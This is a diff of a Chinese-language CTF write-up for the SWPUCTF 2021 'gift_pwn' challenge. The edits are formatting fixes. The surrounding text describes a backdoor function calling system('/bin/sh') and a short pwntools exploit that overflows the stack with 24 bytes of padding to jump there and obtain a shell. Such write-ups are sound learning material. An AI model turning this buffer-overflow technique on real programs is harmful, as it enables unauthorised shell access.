@@ -9,6 +9,7 @@
 ## 一、看到什么
 
 ### 附件分析
+
 ![file](./images/SWPUCTF_2021_gift_pwn-file.png) 
 
 - 64位 ELF文件 
@@ -23,7 +24,7 @@
 ![vuln](./images/SWPUCTF_2021_gift_pwn-vuln.png) 
 
 - `gift` 函数
-    - backdoor 调用 `system(/bin/sh) 
+    - backdoor 调用 `system(/bin/sh)`
     - 起始地址 `0x4005b6`
 
 ![gift](./images/SWPUCTF_2021_gift_pwn-gift.png) 
@@ -43,4 +44,5 @@ payload = b'A'*24 + p64(0x4005b6)
 p.sendline(payload)
 p.interactive()
 ```
+
 ![getshell](./images/SWPUCTF_2021_gift_pwn-getshell.png) 
